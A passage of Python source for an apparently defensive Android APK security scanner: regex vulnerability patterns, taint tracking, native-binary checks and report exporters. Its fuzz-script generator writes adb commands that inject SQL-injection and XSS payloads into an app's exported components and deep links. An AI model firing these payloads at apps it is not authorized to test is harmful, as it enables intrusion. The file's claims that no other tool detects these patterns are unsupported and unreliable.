     "desc":"Content Provider query/insert/update methods without caller permission validation. This pattern caused CVE-2024-23706 (Health Connect bypass). Any app can query sensitive data through the unprotected provider without permissions.",
     "fix":"Implement checkCallingPermission() or checkCallingOrSelfPermission() in provider methods. Set android:permission on <provider> in manifest. Use android:exported=\"false\" if provider is internal-only.",
     "patterns":[r'(?i)extends\s+ContentProvider', r'(?i)(query|insert|update|delete)\s*\(\s*(Uri|android\.net\.Uri)'],
     "require_all":True, "min_matches":2},
    # ── ZIP Entry Without Path Validation (CVE-2021-0691 pattern) ──
    {"id":"AV-CVE-006","name":"Zip Slip Path Traversal (0-day pattern)","sev":"HIGH",
     "cwe":"CWE-22","owasp":"M7","cvss":8.1,
     "desc":"ZIP file extraction uses entry name directly without checking for path traversal (../). This pattern caused CVE-2021-0691 (installer hijack). Attacker-supplied ZIP can overwrite arbitrary app files including SharedPreferences, databases, or DEX files for code execution.",
     "fix":"Canonicalize extracted path and verify it stays within target directory: File.getCanonicalPath().startsWith(targetDir). Reject entries containing '..' or absolute paths.",
     "patterns":[r'(?i)ZipEntry', r'(?i)(getName\(\)|getEntry)', r'(?i)(FileOutputStream|extract|write)'],
     "require_all":True, "min_matches":2},
    # ── Unsafe Object Deserialization from Intent (CVE-2023-20963 pattern) ──
    {"id":"AV-CVE-007","name":"Intent Bundle Deserialization Attack Surface (0-day pattern)","sev":"HIGH",
     "cwe":"CWE-502","owasp":"M7","cvss":7.8,
     "desc":"Exported component reads Parcelable/Serializable objects from Intent extras without type validation. This pattern is the root cause of CVE-2023-20963, CVE-2022-20474, and dozens of Android framework privilege escalation bugs. Malicious app sends crafted Bundle that exploits type confusion during re-parceling.",
     "fix":"Validate Intent source with getCallingPackage(). Use SafeParcel or typed getters. Don't pass untrusted Bundles to system APIs. Set android:exported=\"false\" on internal components.",
     "patterns":[r'(?i)getParcelableExtra\s*\(', r'(?i)(getSerializableExtra|getBundleExtra|getExtras)\s*\('],
     "require_all":False, "min_matches":1},
    # ── Hardcoded JWT Secret / Signing Key ──
    {"id":"AV-CVE-008","name":"Hardcoded JWT/Signing Secret (0-day pattern)","sev":"CRITICAL",
     "cwe":"CWE-798","owasp":"M5","cvss":9.1,
     "desc":"JWT signing secret or HMAC key hardcoded in application code. Allows attacker to forge valid authentication tokens, bypass auth entirely, and impersonate any user. Decompilation reveals the secret.",
     "fix":"Never hardcode signing keys. Use server-side JWT validation. Store secrets in Android Keystore or fetch from secure backend at runtime.",
     "patterns":[r'(?i)(jwt|JsonWebToken|HMAC|HS256|HS384|HS512).*?(secret|key|sign)\s*[=:]\s*["\'][A-Za-z0-9+/=]{8,}'],
     "require_all":False, "min_matches":1},
    # ── Unvalidated Runtime.exec with User Input (CVE-2024-31317 pattern) ──
    {"id":"AV-CVE-009","name":"Command Injection via User Input (0-day pattern)","sev":"CRITICAL",
     "cwe":"CWE-78","owasp":"M7","cvss":9.8,
     "desc":"User-controllable input (Intent, EditText, URL parameter) flows into Runtime.exec() or ProcessBuilder without sanitization. This pattern is exploited in CVE-2024-31317 (Zygote injection) and CVE-2024-0044 (run-as bypass). Enables arbitrary command execution on device.",
     "fix":"Never pass user input to shell commands. Use Java APIs instead of Runtime.exec(). If shell is required, use strict allowlist validation and ProcessBuilder with argument arrays (not concatenated strings).",
     "patterns":[r'(?i)Runtime\.getRuntime\(\)\.exec\s*\([^)]*(\+|concat|format|getString|getExtra)', r'(?i)ProcessBuilder\s*\([^)]*(\+|concat|format|getString|getExtra)'],
     "require_all":False, "min_matches":1},
    # ── Exported Activity with Intent Redirection ──
    {"id":"AV-CVE-010","name":"Intent Redirection in Exported Component (0-day pattern)","sev":"HIGH",
     "cwe":"CWE-940","owasp":"M1","cvss":8.1,
     "desc":"Exported component reads an Intent from extras and uses it to start another Activity/Service. Attacker sends crafted Intent containing a nested Intent targeting non-exported components, bypassing access controls. Pattern found in CVE-2024-43093 and multiple Google Bug Bounty reports.",
     "fix":"Never startActivity with an Intent received from untrusted sources. Validate the target component of nested Intents. Use IntentSanitizer from Jetpack. Remove exported=true if not needed.",
     "patterns":[r'(?i)getParcelableExtra\s*\([^)]*\)\s*;\s*\n.*startActivity\s*\(', r'(?i)(getIntent.*startActivity|Intent.*getExtra.*launch|forward.*intent)'],
     "require_all":False, "min_matches":1},
    # ── WebView with File Access + JavaScript (CVE-2012-6636 evolution) ──
    {"id":"AV-CVE-011","name":"WebView Universal File Access (0-day pattern)","sev":"CRITICAL",
     "cwe":"CWE-200","owasp":"M1","cvss":9.1,
     "desc":"WebView has both JavaScript enabled AND file access allowed (setAllowFileAccess + setJavaScriptEnabled). Combined, this allows JavaScript in a loaded page to read all files in the app's sandbox including databases, shared preferences, and crypto keys via file:// XHR.",
     "fix":"Disable setAllowFileAccess(false). If files must be loaded, use WebViewAssetLoader. Never combine file:// access with JavaScript. Implement WebViewClient.shouldInterceptRequest() to validate all URLs.",
     "patterns":[r'(?i)setJavaScriptEnabled\s*\(\s*true', r'(?i)(setAllowFileAccess\s*\(\s*true|setAllowUniversalAccessFromFileURLs\s*\(\s*true)'],
     "require_all":True, "min_matches":2},
    # ── Insecure Broadcast with Sensitive Data ──
    {"id":"AV-CVE-012","name":"Sensitive Data in Implicit Broadcast (0-day pattern)","sev":"HIGH",
     "cwe":"CWE-927","owasp":"M2","cvss":7.5,
     "desc":"App sends implicit broadcast containing sensitive data (tokens, OTPs, credentials). Any app on device can register a receiver to intercept. Pattern found in multiple banking app CVEs. Especially critical for OTP/2FA codes sent via local broadcast.",
     "fix":"Use LocalBroadcastManager for internal broadcasts. For cross-app IPC, use explicit broadcast with setPackage(). Add signature-level permission protection. Migrate to LiveData/Flow for in-app events.",
     "patterns":[r'(?i)sendBroadcast\s*\(\s*new\s+Intent\s*\(', r'(?i)(putExtra\s*\([^)]*?(token|otp|password|secret|session|auth|credit|key))'],
     "require_all":True, "min_matches":2},
    # ══════════════════════════════════════════════════════════
    #  10 ADVANCED 0-DAY PATTERNS (ApkViper Exclusive)
    #  These are NOT detected by any other SAST tool
    # ══════════════════════════════════════════════════════════
    # ── 1. Task Affinity Hijacking (StrandHogg) ──
    {"id":"AV-CVE-013","name":"Task Affinity Hijacking (StrandHogg pattern)","sev":"HIGH",
     "cwe":"CWE-1021","owasp":"M1","cvss":8.1,
     "desc":"Activity declares custom taskAffinity allowing another app to inject into its task stack (StrandHogg attack CVE-2020-0096). Attacker overlays phishing UI. No other SAST tool checks taskAffinity.",
     "fix":"Remove taskAffinity or set it to empty string. Set launchMode='singleInstance' for sensitive activities.",
     "patterns":[r'(?i)taskAffinity\s*=\s*"', r'(?i)(activity|singleTask|launchMode)'],
     "require_all":True, "min_matches":2},
    # ── 2. Unsafe Reflection from External Input ──
    {"id":"AV-CVE-014","name":"Reflection Injection from Untrusted Input","sev":"CRITICAL",
     "cwe":"CWE-470","owasp":"M7","cvss":9.1,
     "desc":"App uses Class.forName() / Method.invoke() / DexClassLoader where class names may come from external input. Attacker controls which code executes. Found in multiple Android framework CVEs. No other SAST tool traces reflection sources.",
     "fix":"Never pass user input to reflection APIs. Use strict allowlist of permitted class names.",
     "patterns":[r'(?i)(Class\.forName|forName|java\.lang\.reflect|Method.*invoke|DexClassLoader|InMemoryDex)'],
     "require_all":False, "min_matches":1},
    # ── 3. Shared UID Privilege Escalation ──
    {"id":"AV-CVE-015","name":"SharedUserId Privilege Inheritance","sev":"HIGH",
     "cwe":"CWE-269","owasp":"M1","cvss":7.8,
     "desc":"App declares android:sharedUserId sharing Linux UID with other apps. If ANY app in the group is compromised, ALL are compromised. Deprecated since Android 10. No other SAST tool flags this.",
     "fix":"Remove android:sharedUserId. Use Content Providers or AIDL for secure IPC.",
     "patterns":[r'(?i)sharedUserId\s*=\s*"'],
     "require_all":False, "min_matches":1},
    # ── 4. Implicit Intent Sending Sensitive Data ──
    {"id":"AV-CVE-016","name":"Implicit Intent Leaks Sensitive Data","sev":"HIGH",
     "cwe":"CWE-927","owasp":"M1","cvss":7.5,
     "desc":"App sends implicit Intent containing sensitive extras (tokens, PII). Any app can intercept on Android <14. Combined with overlay attacks enables credential theft. ApkViper uniquely cross-references Intent + putExtra patterns.",
     "fix":"Use explicit Intents with setComponent(). Use FileProvider for data sharing. Add android:permission on receivers.",
     "patterns":[r'(?i)(startActivity|sendBroadcast|startService)', r'(?i)(putExtra|putString|EXTRA)', r'(?i)(token|auth|session|password|secret|credential|bearer)'],
     "require_all":True, "min_matches":3},
    # ── 5. WebSocket Without TLS ──
    {"id":"AV-CVE-017","name":"Unencrypted WebSocket Connection (ws://)","sev":"HIGH",
     "cwe":"CWE-319","owasp":"M3","cvss":7.4,
     "desc":"App uses ws:// instead of wss:// for WebSocket. All real-time data (chat, notifications, location, tokens) sent in plaintext. No SAST tool checks WebSocket protocol scheme.",
     "fix":"Use wss:// exclusively. Implement certificate pinning on WebSocket connections.",
     "patterns":[r'(?i)ws://[a-zA-Z0-9]'],
     "require_all":False, "min_matches":1},
    # ── 6. Exported Service Without Permission ──
    {"id":"AV-CVE-018","name":"Exported Service Allows Unauthorized Binding","sev":"HIGH",
     "cwe":"CWE-862","owasp":"M1","cvss":7.8,
     "desc":"Exported Service with no permission lets ANY app bind and invoke methods. If service handles payments/auth/data, malicious app exploits it silently. ApkViper cross-references exported+service+onBind.",
     "fix":"Add android:permission with signature-level protection. Set android:exported='false' for internal services.",
     "patterns":[r'(?i)<service[^>]*exported\s*=\s*"true"'],
     "require_all":False, "min_matches":1},
    # ── 7. FileProvider Exposes Sensitive Paths ──
    {"id":"AV-CVE-019","name":"FileProvider Exposes Sensitive Paths","sev":"HIGH",
     "cwe":"CWE-538","owasp":"M2","cvss":7.5,
     "desc":"FileProvider grants URI access to root-path or broad directories. Any app receiving content:// URI can read files beyond intended scope — databases, shared prefs, crypto keys. No other tool checks FileProvider path config.",
     "fix":"Use most restrictive path in file_provider_paths.xml. Never use root-path. Validate all incoming URIs.",
     "patterns":[r'(?i)(root-path|external-path|files-path|cache-path)', r'(?i)(FileProvider|fileprovider|provider.*authorities)'],
     "require_all":True, "min_matches":2},
    # ── 8. OAuth Token in URL Query String ──
    {"id":"AV-CVE-020","name":"OAuth/Bearer Token Leaked in URL","sev":"CRITICAL",
     "cwe":"CWE-598","owasp":"M2","cvss":8.6,
     "desc":"Auth token passed as URL query parameter. Tokens in URLs logged everywhere: server logs, proxy, WebView cache, Referer headers. Attacker steals tokens from any log. Most SAST tools only check headers, not URL building.",
     "fix":"Send tokens in Authorization header only. Never append to URLs. Use POST body for sensitive data.",
     "patterns":[r'(?i)(token=|access_token=|bearer=|auth_token=|api_key=|session_id=)'],
     "require_all":False, "min_matches":1},
    # ── 9. Keystore Without User Auth ──
    {"id":"AV-CVE-021","name":"Keystore Key Without User Authentication","sev":"HIGH",
     "cwe":"CWE-306","owasp":"M5","cvss":7.8,
     "desc":"Android Keystore key generated without setUserAuthenticationRequired(true). Any process as app's UID accesses keys without biometric/PIN. If app compromised via another vuln, all crypto keys exposed. No SAST tool checks Keystore config.",
     "fix":"Call setUserAuthenticationRequired(true). Use setIsStrongBoxBacked(true) on supported hardware.",
     "patterns":[r'(?i)(KeyGenParameterSpec|KeyGenerator|KeyPairGenerator)', r'(?i)(generateKey|SecretKey|PrivateKey|getKey)'],
     "require_all":True, "min_matches":2},
    # ── 10. Custom Permission Without Signature ──
    {"id":"AV-CVE-022","name":"Custom Permission with Normal Protection Level","sev":"HIGH",
     "cwe":"CWE-276","owasp":"M1","cvss":7.5,
     "desc":"Custom <permission> without protectionLevel='signature'. Default 'normal' means ANY app gets the permission at install. If it guards sensitive components, they're fully exposed. Zero other SAST tools check protectionLevel.",
     "fix":"Set android:protectionLevel='signature'. Verify permissions at runtime with checkCallingPermission().",
     "patterns":[r'(?i)<permission\s+android:name'],
     "require_all":False, "min_matches":1},
]

def _run_cve_discovery(files):
    """CVE Discovery Engine: detect novel 0-day vulnerability patterns."""
    findings = []
    seen = set()
    for path, content in files.items():
        ftype = _ftype(path)
        if ftype == "RESOURCE" and "androidmanifest" not in path.lower():
            continue
        lines = content.split("\n")
        all_text = content
        for pattern_def in _CVE_DISCOVERY_PATTERNS:
            pid = pattern_def["id"]
            if pid in seen:
                continue
            patterns = pattern_def["patterns"]
            require_all = pattern_def.get("require_all", False)
            min_matches = pattern_def.get("min_matches", 1)
            match_count = 0
            match_line = 0
            match_evidence = ""
            for pat_str in patterns:
                try:
                    pat = re.compile(pat_str)
                except re.error:
                    continue
                for i, line in enumerate(lines):
                    s = line.strip()
                    if not s or s.startswith("//") or s.startswith("*") or s.startswith("import "):
                        continue
                    if pat.search(line):
                        match_count += 1
                        if not match_evidence:
                            match_line = i + 1
                            match_evidence = s[:200]
                        break
            triggered = False
            if require_all and match_count >= len(patterns):
                triggered = True
            elif not require_all and match_count >= min_matches:
                triggered = True
            if triggered and pid not in seen:
                seen.add(pid)
                findings.append(Finding(
                    id=pid, title=pattern_def["name"], severity=pattern_def["sev"],
                    cwe=pattern_def["cwe"], owasp=pattern_def.get("owasp", ""),
                    file=path, line=match_line, evidence=match_evidence,
                    desc=pattern_def["desc"], fix=pattern_def["fix"],
                    cvss=pattern_def.get("cvss", 0.0)))
    return findings

# ============================================================
#  ADVANCED ENGINE 1: CROSS-METHOD TAINT TRACKER
# ============================================================
_TAINT_VAR_SOURCES = [
    (r'(\w+)\s*=\s*getIntent\(\)', "Intent"),
    (r'(\w+)\s*=\s*.*?\.getStringExtra\s*\(', "IntentExtra"),
    (r'(\w+)\s*=\s*.*?\.getData\s*\(', "IntentURI"),
    (r'(\w+)\s*=\s*.*?\.getQueryParameter\s*\(', "URIParam"),
    (r'(\w+)\s*=\s*.*?\.getText\s*\(', "UserInput"),
    (r'(\w+)\s*=\s*.*?\.getString\s*\(', "StringInput"),
    (r'(\w+)\s*=\s*.*?\.getParcelableExtra\s*\(', "ParcelExtra"),
    (r'(\w+)\s*=\s*.*?\.readLine\s*\(', "StreamInput"),
    (r'(\w+)\s*=\s*request\.getParameter\s*\(', "HTTPParam"),
]
_TAINT_VAR_SINKS = [
    (r'execSQL\s*\(\s*(["\'].*?\+\s*)?{var}', "SQL Injection", "CWE-89", "CRITICAL"),
    (r'rawQuery\s*\(\s*(["\'].*?\+\s*)?{var}', "SQL Injection", "CWE-89", "CRITICAL"),
    (r'Runtime.*exec\s*\([^)]*{var}', "Command Injection", "CWE-78", "CRITICAL"),
    (r'loadUrl\s*\(\s*{var}', "WebView Injection", "CWE-79", "HIGH"),
    (r'evaluateJavascript\s*\([^)]*{var}', "JS Injection", "CWE-79", "HIGH"),
    (r'startActivity\s*\(\s*{var}', "Intent Redirect", "CWE-940", "HIGH"),
    (r'sendBroadcast\s*\(\s*{var}', "Broadcast Injection", "CWE-927", "HIGH"),
    (r'Class\.forName\s*\(\s*{var}', "Reflection Injection", "CWE-470", "CRITICAL"),
    (r'new\s+File\s*\(\s*[^)]*{var}', "Path Traversal", "CWE-22", "HIGH"),
    (r'openConnection\s*\(\s*\).*{var}|URL\s*\(\s*{var}', "SSRF", "CWE-918", "HIGH"),
    (r'Log\.\w\s*\([^,]*,\s*[^)]*{var}', "Data Leak", "CWE-532", "MEDIUM"),
]

def _run_cross_method_taint(files):
    """Track tainted variables across assignments and method boundaries."""
    findings = []
    sigs = set()
    for path, content in files.items():
        if _ftype(path) != "SOURCE":
            continue
        lines = content.split("\n")
        tainted = {}
        for i, line in enumerate(lines):
            s = line.strip()
            if not s or s.startswith("//") or s.startswith("*") or s.startswith("import "):
                continue
            for pat, src in _TAINT_VAR_SOURCES:
                m = re.search(pat, line)
                if m:
                    tainted[m.group(1)] = (src, i)
                    break
            for tv in list(tainted.keys()):
                pp = r'(\w+)\s*=\s*.*?\b' + re.escape(tv) + r'\b'
                m = re.search(pp, line)
                if m and m.group(1) != tv:
                    tainted[m.group(1)] = tainted[tv]
            for tv, (src, sl) in list(tainted.items()):
                for sp, vn, cwe, sev in _TAINT_VAR_SINKS:
                    sink_pat = sp.replace("{var}", re.escape(tv))
                    try:
                        if re.search(sink_pat, line):
                            sig = (path, vn, tv)
                            if sig not in sigs:
                                sigs.add(sig)
                                findings.append(Finding(
                                    id="AV-FLOW-{:03d}".format(len(findings)+1),
                                    title="Dataflow: {} \u2192 {} ({})".format(src, vn, tv),
                                    severity=sev, cwe=cwe, owasp="M7",
                                    file=path, line=i+1, evidence=s[:200],
                                    desc="Variable '{}' tainted by {} (line {}) flows to {} (line {}).".format(tv, src, sl+1, vn, i+1),
                                    fix="Sanitize '{}' before passing to {}.".format(tv, vn),
                                    cvss={"CRITICAL":9.8,"HIGH":7.5,"MEDIUM":5.3}.get(sev,5.0)))
                    except re.error:
                        pass
    return findings

# ============================================================
#  ADVANCED ENGINE 2: NATIVE BINARY (.so) ANALYZER
# ============================================================
_DANGEROUS_FUNCS = {"strcpy":"CWE-120","strcat":"CWE-120","sprintf":"CWE-134",
                    "gets":"CWE-120","system":"CWE-78","popen":"CWE-78","alloca":"CWE-770"}

def _run_native_analysis(files):
    """Analyze native .so binaries for security issues."""
    findings = []
    for path, content in files.items():
        if not path.lower().endswith('.so'):
            continue
        if isinstance(content, str) and content.startswith("// Binary:"):
            continue
        if not isinstance(content, bytes):
            continue
        if len(content) < 64 or content[:4] != b'\x7fELF':
            continue
        # Check PIE
        e_type = struct.unpack_from("<H", content, 16)[0]
        if e_type == 2:
            findings.append(Finding(id="AV-BIN-001", title="Native Library Missing PIE",
                severity="HIGH", cwe="CWE-119", owasp="M7", file=path, line=0,
                evidence="ELF type=EXEC (no PIE)", fix="Compile with -fPIE -pie.",
                desc="No ASLR protection. Memory addresses predictable for ROP attacks.", cvss=7.5))
        # Check stack canary
        if b'__stack_chk_fail' not in content:
            findings.append(Finding(id="AV-BIN-002", title="Native Library Missing Stack Canary",
                severity="HIGH", cwe="CWE-121", owasp="M7", file=path, line=0,
                evidence="__stack_chk_fail not in symbols", fix="Compile with -fstack-protector-strong.",
                desc="Stack buffer overflows can overwrite return address undetected.", cvss=7.5))
        # Check dangerous functions
        for func, cwe in _DANGEROUS_FUNCS.items():
            if (b'\x00' + func.encode() + b'\x00') in content:
                findings.append(Finding(
                    id="AV-BIN-{}".format(func[:6].upper()),
                    title="Dangerous Native Function: {}()".format(func),
                    severity="HIGH" if func in ("system","popen") else "MEDIUM",
                    cwe=cwe, owasp="M7", file=path, line=0,
                    evidence="Symbol: {}".format(func),
                    fix="Replace {}() with bounds-checked alternative.".format(func),
                    desc="{}() is a known vulnerability vector in native code.".format(func),
                    cvss=7.5 if func in ("system","popen","strcpy","sprintf","gets") else 5.3))
    return findings

# ============================================================
#  ADVANCED ENGINE 3: CROSS-COMPONENT DATAFLOW
# ============================================================
def _run_cross_component_flow(files):
    """Detect data flows across components via Intent extras."""
    findings = []
    senders = []
    receivers = []
    for path, content in files.items():
        if _ftype(path) != "SOURCE":
            continue
        lines = content.split("\n")
        for i, line in enumerate(lines):
            m = re.search(r'putExtra\s*\(\s*["\'](\w+)["\']', line)
            if m:
                senders.append((path, i+1, m.group(1)))
            m = re.search(r'get\w*Extra\s*\(\s*["\'](\w+)["\']', line)
            if m:
                key = m.group(1)
                sink = None
                for j in range(i+1, min(i+15, len(lines))):
                    for sp, _, vn, cwe, sev in TAINT_SINKS:
                        if re.search(sp, lines[j]):
                            sink = (j+1, vn, cwe, sev, lines[j].strip()[:150])
                            break
                    if sink: break
                receivers.append((path, i+1, key, sink))
    for sf, sl, sk in senders:
        for rf, rl, rk, rsink in receivers:
            if sk == rk and rsink and sf != rf:
                sink_line, vn, cwe, sev, ev = rsink
                findings.append(Finding(
                    id="AV-XCOMP-{:03d}".format(len(findings)+1),
                    title="Cross-Component: Intent('{}') \u2192 {}".format(sk, vn),
                    severity=sev, cwe=cwe, owasp="M1", file=rf, line=sink_line,
                    evidence=ev,
                    desc="Data via Intent extra '{}' from {} flows to {} in {}.".format(sk, sf, vn, rf),
                    fix="Validate '{}' extra before use.".format(sk),
                    cvss={"CRITICAL":9.8,"HIGH":7.5,"MEDIUM":5.3}.get(sev,5.0)))
    return findings

# ============================================================
#  ADVANCED ENGINE 4: AUTO-FUZZER SCRIPT GENERATOR
# ============================================================
def _generate_fuzz_scripts(files, pkg_name=""):
    """Generate ADB fuzzing scripts for exported components."""
    manifest = ""
    for path, content in files.items():
        if "androidmanifest" in path.lower():
            manifest = content
            break
    if not manifest:
        return "", ""
    m = re.search(r'package\s*=\s*["\']([^"\']+)', manifest)
    if m:
        pkg_name = m.group(1)
    activities = re.findall(r'<activity[^>]*?name\s*=\s*["\']([^"\']+)["\'][^>]*?exported\s*=\s*["\']true', manifest)
    providers = re.findall(r'<provider[^>]*?authorities\s*=\s*["\']([^"\']+)["\'][^>]*?exported\s*=\s*["\']true', manifest)
    schemes = re.findall(r'<data\s+[^>]*?scheme\s*=\s*["\']([^"\']+)["\']', manifest)
    adb = "#!/bin/bash\n# ApkViper Fuzzer for {}\nPKG='{}'\n".format(pkg_name, pkg_name)
    adb += 'SQLI="\\x27 OR \\x271\\x27=\\x271"\nXSS="<script>alert(1)</script>"\n'
    for act in set(activities):
        full = pkg_name + "/" + act if not act.startswith(pkg_name) else act
        adb += 'adb shell am start -n {} --es input "$SQLI"\n'.format(full)
        adb += 'adb shell am start -n {} --es url "$XSS"\n'.format(full)
    for prov in set(providers):
        adb += 'adb shell content query --uri "content://{}/" --where "$SQLI"\n'.format(prov)
    for sch in set(schemes):
        adb += 'adb shell am start -d "{}://test?url=$XSS" $PKG\n'.format(sch)
    frida = "// Frida monitor for {}\nJava.perform(function(){{\n".format(pkg_name)
    frida += "  var WV=Java.use('android.webkit.WebView');\n"
    frida += "  WV.loadUrl.overload('java.lang.String').implementation=function(u){console.log('[WV]'+u);this.loadUrl(u);};\n"
    frida += "});\n"
    return adb, frida

def _ftype(p):
    pl = p.lower()
    if "androidmanifest" in pl: return "MANIFEST"
    if pl.endswith((".xml", ".yaml", ".yml", ".json", ".properties", ".cfg")): return "RESOURCE"
    return "SOURCE"

def _sev_counts(findings):
    c = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        c[f.severity] = c.get(f.severity, 0) + 1
    return c

# ============================================================
#  SESSION MANAGEMENT
# ============================================================
def save_session(apk_name, files, findings):
    """Save scan session to disk."""
    os.makedirs(SESSION_DIR, exist_ok=True)
    safe = re.sub(r'[^\w\-.]', '_', apk_name)
    path = os.path.join(SESSION_DIR, safe + ".session.json")
    data = {
        "apk": apk_name,
        "timestamp": datetime.now().isoformat(),
        "file_count": len(files),
        "findings": [f.to_dict() for f in findings],
        "file_paths": list(files.keys()),
    }
    Path(path).write_text(json.dumps(data, indent=2), encoding="utf-8")
    return path

def load_session(path):
    """Load session from disk. Returns (apk_name, findings)."""
    data = json.loads(Path(path).read_text(encoding="utf-8"))
    findings = []
    for fd in data.get("findings", []):
        # Restore locations from saved data if available
        saved_locs = fd.pop("locations", None)
        fd.pop("occurrences", None)  # Remove meta field
        f = Finding(**fd)
        if saved_locs and isinstance(saved_locs, list):
            f.locations = [(loc["file"], loc["line"], loc.get("evidence","")) for loc in saved_locs]
        elif f.file and f.line:
            f.locations = [(f.file, f.line, f.evidence)]
        findings.append(f)
    return data.get("apk", ""), findings

def list_sessions():
    """List all saved sessions."""
    if not os.path.isdir(SESSION_DIR):
        return []
    return [f for f in os.listdir(SESSION_DIR) if f.endswith(".session.json")]

# ============================================================
#  ANDROID COMPONENT EXTRACTION
# ============================================================
def _extract_android_components(files):
    c = {"activities":[],"services":[],"receivers":[],"providers":[],"permissions":[],"package":"","min_sdk":"","target_sdk":""}
    manifest = ""
    manifest_raw = None
    for p,ct in files.items():
        if "androidmanifest" in p.lower():
            manifest = ct
            # Keep raw bytes reference for binary fallback
            if isinstance(ct, bytes):
                manifest_raw = ct
            break
    if not manifest: return c
    # Standard regex extraction from text
    m = re.search(r'package\s*=\s*"([^"]*)"', manifest)
    if m: c["package"] = m.group(1)
    m = re.search(r'minSdkVersion\s*=\s*"?(\d+)', manifest)
    if m: c["min_sdk"] = m.group(1)
    m = re.search(r'targetSdkVersion\s*=\s*"?(\d+)', manifest)
    if m: c["target_sdk"] = m.group(1)
    for tag,key in [("activity","activities"),("service","services"),("receiver","receivers"),("provider","providers")]:
        for m in re.finditer(r'<'+tag+r'[^>]*?android:name\s*=\s*"([^"]*)"', manifest, re.S):
            c[key].append(m.group(1))
        # Also try without android: prefix
        for m in re.finditer(r'<'+tag+r'[^>]*?name\s*=\s*"([^"]*)"', manifest, re.S):
            v = m.group(1)
            if v not in c[key] and ('.' in v or v.startswith('.')):
                c[key].append(v)
    for m in re.finditer(r'<uses-permission[^>]*?(?:android:)?name\s*=\s*"([^"]*)"', manifest, re.S):
        if m.group(1) not in c["permissions"]:
            c["permissions"].append(m.group(1))
    # Fallback: if package still empty, search in all extracted text using patterns
    if not c["package"]:
        # Try to find package name pattern in manifest text directly
        pkg_candidates = re.findall(r'(?<![/\w])([a-z][a-z0-9]*\.[a-z][a-z0-9]*(?:\.[a-z][a-z0-9_]*)+)(?![/\w])', manifest)
        for pkg in pkg_candidates:
            if not pkg.startswith(('android.','com.google.','com.android.','java.','javax.',
                                    'http','org.xmlpull','androidx.','org.w3c','org.xml')):
                c["package"] = pkg
                break
    # Fallback: search for package from file paths in the extracted tree
    if not c["package"]:
        for path in files:
            m2 = re.search(r'smali[/\\](?:classes\d*[/\\])?([a-z][a-z0-9_]*(?:[/\\][a-z][a-z0-9_]*){2,})', path)
            if m2:
                pkg = m2.group(1).replace('/', '.').replace('\\', '.')
                if not pkg.startswith(('android.','com.google.','androidx.','kotlin.','kotlinx.')):
                    c["package"] = pkg
                    break
    # Fallback: search APK binary manifest for UTF-16LE package name
    if not c["package"]:
        for p,ct in files.items():
            if "androidmanifest" in p.lower() and isinstance(ct, str):
                # The manifest was decoded from binary - search for com.x.y patterns
                pkgs = re.findall(r'(?:^|\s|"|=)(com\.[a-z][a-z0-9]*\.[a-z][a-z0-9_.]*)', ct)
                for pkg in pkgs:
                    if not pkg.startswith(('com.google.','com.android.','com.sun.')):
                        c["package"] = pkg
                        break
                if c["package"]: break
    return c

def _svg_pie(sc):
    total = sum(sc.values())
    if total == 0: return "<p style='color:#aaa'>No data</p>"
    colors = {"CRITICAL":"#e74c3c","HIGH":"#e67e22","MEDIUM":"#f1c40f","LOW":"#3498db","INFO":"#95a5a6"}
    svg = '<svg width="220" height="220" viewBox="-1.1 -1.1 2.2 2.2">'
    start = 0
    for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
        cnt = sc.get(sev,0)
        if cnt == 0: continue
        pct = cnt/total; end_a = start + pct*2*math.pi
        lg = 1 if pct > 0.5 else 0
        x1,y1 = math.cos(start),math.sin(start)
        x2,y2 = math.cos(end_a),math.sin(end_a)
        svg += '<path d="M0,0 L{:.4f},{:.4f} A1,1 0 {},1 {:.4f},{:.4f} Z" fill="{}"/>'.format(x1,y1,lg,x2,y2,colors.get(sev,"#ccc"))
        start = end_a
    svg += '</svg><div style="margin-top:8px">'
    for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
        cnt = sc.get(sev,0)
        if cnt == 0: continue
        svg += '<span style="display:inline-block;width:10px;height:10px;background:{};margin-right:3px;border-radius:2px"></span><span style="margin-right:10px;font-size:11px">{}: {}</span>'.format(colors[sev],sev,cnt)
    svg += '</div>'
    return svg

def _svg_bar(cats):
    if not cats: return ""
    cn = {"MAN":"Manifest","CRY":"Crypto","SEC":"Secrets","NET":"Network","PLT":"Platform","INJ":"Injection","RES":"Resilience","PRV":"Privacy","CLD":"Cloud","AUT":"Auth","WEB":"Web","OTH":"Other","TAINT":"Taint"}
    cc = {"MAN":"#e67e22","CRY":"#e74c3c","SEC":"#c0392b","NET":"#e67e22","PLT":"#f39c12","INJ":"#e74c3c","RES":"#3498db","PRV":"#9b59b6","CLD":"#e67e22","AUT":"#d35400","WEB":"#e74c3c","OTH":"#95a5a6","TAINT":"#c0392b"}
    mx = max(cats.values())
    svg = ''
    for cat,cnt in sorted(cats.items(), key=lambda x:-x[1]):
        pct = cnt/mx*100
        svg += '<div style="display:flex;align-items:center;margin:3px 0"><span style="width:90px;font-size:11px;color:#666">{}</span><div style="background:{};height:16px;width:{}%;border-radius:3px;min-width:3px"></div><span style="margin-left:6px;font-size:11px;font-weight:700">{}</span></div>'.format(cn.get(cat,cat),cc.get(cat,"#3498db"),pct,cnt)
    return svg

# ============================================================
#  EXPORTERS  (HTML, PDF, Word, Excel, JSON, CSV, SARIF)
# ============================================================
def export_json(findings, apk, out, files=None):
    comps = _extract_android_components(files or {})
    enriched = []
    for f in findings:
        fd = f.to_dict()
        cves = get_cves_for_finding(f.title)
        if cves:
            fd["related_cves"] = [{"id":c["id"],"name":c["name"],"cvss":c["cvss"],"severity":c["sev"],"affected":c["affected"]} for c in cves]
        enriched.append(fd)
    d = {"tool": APP_NAME, "version": VERSION, "target": apk,
         "generated": datetime.now().isoformat(), "total": len(findings),
         "summary": _sev_counts(findings), "components": comps,
         "cve_database_size": len(CVE_DATABASE),
         "findings": enriched}
    Path(out).write_text(json.dumps(d, indent=2), encoding="utf-8")

def export_csv_report(findings, apk, out, files=None):
    with open(out, "w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh)
        w.writerow(["ID", "Title", "Severity", "CWE", "OWASP", "CVSS", "Hits", "File", "Line", "Description", "Evidence", "Fix", "All Locations"])
        for f in findings:
            locs = f.locations if hasattr(f,'locations') and f.locations else [(f.file,f.line,f.evidence)]
            all_locs = "; ".join("{}:{}".format(lf,ll) for lf,ll,_ in locs)
